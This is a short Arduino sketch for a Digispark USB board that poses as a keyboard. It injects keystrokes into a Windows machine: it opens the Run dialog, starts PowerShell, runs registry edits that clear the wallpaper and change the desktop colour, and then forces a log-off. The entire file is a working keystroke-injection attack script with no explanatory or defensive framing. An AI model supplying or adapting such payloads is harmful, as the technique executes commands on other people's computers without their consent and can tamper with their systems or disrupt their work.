#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  pinMode(1,OUTPUT);
  digitalWrite(1,HIGH);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("reg add 'HKEY_CURRENT_USER\\control panel\\desktop' /v wallpaper /t REG_SZ /d '' /d /f ");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("reg add 'HKEY_CURRENT_USER\\control panel\\colors' /v background /t REG_SZ /d '123 123 213' /f ");
  digitalWrite(1,LOW);
  DigiKeyboard.println("shutdown /l");
}

void loop() {
}
